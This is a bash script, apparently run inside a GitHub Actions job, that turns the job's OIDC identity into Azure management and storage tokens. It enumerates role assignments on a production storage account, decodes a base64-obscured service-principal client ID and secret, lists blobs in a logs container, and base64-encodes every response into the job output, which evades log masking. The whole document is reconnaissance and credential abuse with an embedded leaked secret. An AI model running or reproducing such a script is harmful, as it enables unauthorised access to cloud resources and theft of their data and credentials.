#!/bin/bash
set -e

# Step 1: Get OIDC token
OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r .value)

# Step 2: Exchange for management token
MT=$(curl -sS -X POST "https://login.microsoftonline.com/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" \
  -d "client_id=72ff278a-9e71-43ec-bac4-2ca303f8e462" \
  -d "scope=https://management.azure.com/.default" \
  -d "grant_type=client_credentials" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=$OIDC" | jq -r .access_token)

echo "MT_LEN=${#MT}"

# Step 3: Get role assignments on sttblcilogsprodx3euoz for 70a07660
echo "=== ROLE ASSIGNMENTS ==="
RA=$(curl -sS "https://management.azure.com/subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/sttblcilogsprodx3euoz/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&%24filter=principalId%20eq%20%2770a07660-06bb-4396-b754-59fbad0b143e%27" \
  -H "Authorization: Bearer $MT")
echo "RA_B64=$(echo "$RA" | base64 -w0)"

# Step 4: All role assignments
echo "=== ALL RA ==="
ALL_RA=$(curl -sS "https://management.azure.com/subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/sttblcilogsprodx3euoz/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" \
  -H "Authorization: Bearer $MT")
echo "ALL_RA_B64=$(echo "$ALL_RA" | base64 -w0)"

# Step 5: Storage properties
echo "=== STORAGE PROPS ==="
SP=$(curl -sS "https://management.azure.com/subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/sttblcilogsprodx3euoz?api-version=2023-01-01" \
  -H "Authorization: Bearer $MT")
echo "SP_B64=$(echo "$SP" | base64 -w0)"

# Step 6: Get sync SP storage token (decode creds)
SYNC_CID=$(echo "NDYyZDFjMzgtNDQ1OS00OGI4LTkzMzMtODJlMzg5ZTU5NTE0" | base64 -d)
SYNC_SEC=$(echo "c2sxOFF+cUQyMmtrSFhVQ2ZxWExxZFA5NURrWUpMMzRlTUVSbGNTag==" | base64 -d)
ST=$(curl -sS -X POST "https://login.microsoftonline.com/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" \
  -d "client_id=$SYNC_CID" \
  -d "client_secret=$SYNC_SEC" \
  -d "scope=https://storage.azure.com/.default" \
  -d "grant_type=client_credentials" | jq -r .access_token)
echo "ST_LEN=${#ST}"

# Try list blobs from pipeline
BLOBS=$(curl -sS -w "\nHTTP:%{http_code}" \
  "https://sttblcilogsprodx3euoz.blob.core.windows.net/logs?restype=container&comp=list" \
  -H "Authorization: Bearer $ST" \
  -H "x-ms-version: 2020-10-02")
echo "BLOBS_B64=$(echo "$BLOBS" | base64 -w0)"

echo "=== DONE ==="